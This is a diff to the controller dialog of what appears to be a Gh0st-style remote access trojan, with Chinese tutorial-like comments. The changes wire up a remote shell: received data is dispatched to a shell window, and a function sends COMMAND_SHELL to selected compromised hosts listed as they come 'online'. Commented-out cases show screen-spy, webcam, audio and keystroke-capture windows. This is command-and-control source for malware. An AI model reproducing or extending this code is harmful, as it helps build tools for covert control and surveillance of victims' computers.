@@ -11,12 +11,13 @@
 #include "..\..\common\macros.h"
 
 
+
 #ifdef _DEBUG
 #define new DEBUG_NEW
 #endif
 
 
-CCcRemoteDlg *g_pPCRemoteDlg = NULL;   //声明全局变量
+CCcRemoteDlg *g_pCcRemoteDlg = NULL;   //声明全局变量
 
 CIOCPServer *m_iocpServer = NULL;
 // 用于应用程序“关于”菜单项的 CAboutDlg 对话框
@@ -61,7 +62,7 @@ CCcRemoteDlg::CCcRemoteDlg(CWnd* pParent /*=nullptr*/)
 {
 	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
 	//iCount = 0;
-	g_pPCRemoteDlg = this;
+	g_pCcRemoteDlg = this;
 	if (((CCcRemoteApp *)AfxGetApp())->m_bIsQQwryExist)//APP初始化会检查文件是否存在
 	{
 		m_QQwry = new SEU_QQwry;
@@ -80,6 +81,7 @@ BEGIN_MESSAGE_MAP(CCcRemoteDlg, CDialogEx)
 	//-------------自定义------------
 	ON_MESSAGE(UM_ICONNOTIFY, (LRESULT(__thiscall CWnd::*)(WPARAM, LPARAM))OnIconNotify)
 	ON_MESSAGE(WM_ADDTOLIST,OnAddToList)
+	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
 
 	//-------------系统-------------
 	ON_WM_SYSCOMMAND()
@@ -210,7 +212,7 @@ BOOL CCcRemoteDlg::OnInitDialog()
 	////////////////////////////////////////////////////////////////////////////////////////////////////////
 	////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-
+	m_OnlineCount = 0;//初始上线数为0
 	InitSystemMenu();//初始化系统托盘
 	InitToolBar();//初始化工具栏按钮控件
 	InitMyMenu();//初始化菜单控件
@@ -396,6 +398,7 @@ void CCcRemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CS
 	m_CList_Online.SetItemText(0, ONLINELIST_CPU, strCPU);
 	m_CList_Online.SetItemText(0, ONLINELIST_VIDEO, strVideo);
 	m_CList_Online.SetItemText(0, ONLINELIST_PING, strPing);
+	m_CList_Online.SetItemData(0, (DWORD)pContext);
 	ShowMessage(true, strIP + "主机上线");
 }
 
@@ -485,6 +488,8 @@ void CCcRemoteDlg::OnOnlineCmd()
 {
 	// TODO: 在此添加命令处理程序代码
 	MessageBox("CMD");
+	BYTE	bToken = COMMAND_SHELL;
+	SendSelectCommand(&bToken,sizeof(BYTE));
 }
 
 
@@ -723,7 +728,7 @@ void CCcRemoteDlg::ListenPort()
 	Activate(nPort, nMaxConnection);             //开始监听
 }
 
-
+//控制命令都要经过这个函数
 void CCcRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 {
 	if (pContext == NULL)
@@ -733,28 +738,28 @@ void CCcRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];      //这里就是ClientContext 结构体的int m_Dialog[2];
 
 	// 交给窗口处理
-	/*if (pContext->m_Dialog[0] > 0)                //这里查看是否给他赋值了，如果赋值了就把数据传给功能窗口处理
+	if (pContext->m_Dialog[0] > 0)                //这里查看是否给他赋值了，如果赋值了就把数据传给功能窗口处理
 	{
 		switch (pContext->m_Dialog[0])
 		{
-		case FILEMANAGER_DLG:
-			((CFileManagerDlg *)dlg)->OnReceiveComplete();
-			break;
-		case SCREENSPY_DLG:
-			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
-			break;
-		case WEBCAM_DLG:
-			((CWebCamDlg *)dlg)->OnReceiveComplete();
-			break;
-		case AUDIO_DLG:
-			((CAudioDlg *)dlg)->OnReceiveComplete();
-			break;
-		case KEYBOARD_DLG:
-			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
-			break;
-		case SYSTEM_DLG:
-			((CSystemDlg *)dlg)->OnReceiveComplete();
-			break;
+		//case FILEMANAGER_DLG:
+		//	((CFileManagerDlg *)dlg)->OnReceiveComplete();
+		//	break;
+		//case SCREENSPY_DLG:
+		//	((CScreenSpyDlg *)dlg)->OnReceiveComplete();
+		//	break;
+		//case WEBCAM_DLG:
+		//	((CWebCamDlg *)dlg)->OnReceiveComplete();
+		//	break;
+		//case AUDIO_DLG:
+		//	((CAudioDlg *)dlg)->OnReceiveComplete();
+		//	break;
+		//case KEYBOARD_DLG:
+		//	((CKeyBoardDlg *)dlg)->OnReceiveComplete();
+		//	break;
+		//case SYSTEM_DLG:
+		//	((CSystemDlg *)dlg)->OnReceiveComplete();
+		//	break;
 		case SHELL_DLG:
 			((CShellDlg *)dlg)->OnReceiveComplete();
 			break;
@@ -762,7 +767,7 @@ void CCcRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 			break;
 		}
 		return;
-	}*/
+	}
 
 	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])   //如果没有赋值就判断是否是上线包和打开功能功能窗口
 	{                                                           //讲解后回到ClientContext结构体
@@ -780,14 +785,14 @@ void CCcRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 
 	{
 		//这里处理上线
-		if (m_iocpServer->m_nMaxConnections <= g_pPCRemoteDlg->m_CList_Online.GetItemCount())
+		if (m_iocpServer->m_nMaxConnections <= g_pCcRemoteDlg->m_CList_Online.GetItemCount())
 		{
 			closesocket(pContext->m_Socket);
 		}
 		else
 		{
 			pContext->m_bIsMainSocket = true;
-			g_pPCRemoteDlg->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
+			g_pCcRemoteDlg->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
 		}
 		// 激活
 		BYTE	bToken = COMMAND_ACTIVED;
@@ -814,10 +819,10 @@ void CCcRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 		break;
 	case TOKEN_PSLIST:
 		g_pConnectView->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
-		break;
-	case TOKEN_SHELL_START:
-		g_pConnectView->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
 		break;*/
+	case TOKEN_SHELL_START:
+		g_pCcRemoteDlg->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
+		break;
 		// 命令停止当前操作
 	default:
 		closesocket(pContext->m_Socket);
@@ -927,5 +932,41 @@ LRESULT CCcRemoteDlg::OnAddToList(WPARAM wParam, LPARAM lParam)
 	}
 	catch (...) {}
 
+	return 0;
+}
+
+void CCcRemoteDlg::SendSelectCommand(PBYTE pData, UINT nSize)
+{
+	// TODO: 在此处添加实现代码
+	//取得选中的哪一个服务端list位置
+	POSITION pos = m_CList_Online.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
+	while (pos) //so long as we have a valid POSITION, we keep iterating
+	{
+		int	nItem = m_CList_Online.GetNextSelectedItem(pos);
+
+		//从列表条目中取出ClientContext结构体
+		//上线的时候传进的一个ClientContext值
+		ClientContext* pContext = (ClientContext*)m_CList_Online.GetItemData(nItem); 
+		// 发送获得驱动器列表数据包                                                 
+		m_iocpServer->Send(pContext, pData, nSize);      //调用  m_iocpServer  的Send 函数发送数据  查看m_iocpServer 定义
+
+		//Save the pointer to the new item in our CList
+	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memoryt	.
+}
+
+
+//打开终端管理窗口
+LRESULT CCcRemoteDlg::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
+{
+	ClientContext	*pContext = (ClientContext *)lParam;
+	//这里定义远程终端的对话框，转到远程终端的CShellDlg类的定义  先查看对话框界面后转到OnInitDialog
+	CShellDlg	*dlg = new CShellDlg(this, m_iocpServer, pContext);
+
+	// 设置父窗口为卓面
+	dlg->Create(IDD_SHELL, GetDesktopWindow());
+	dlg->ShowWindow(SW_SHOW);
+
+	pContext->m_Dialog[0] = SHELL_DLG;
+	pContext->m_Dialog[1] = (int)dlg;
 	return 0;
 }
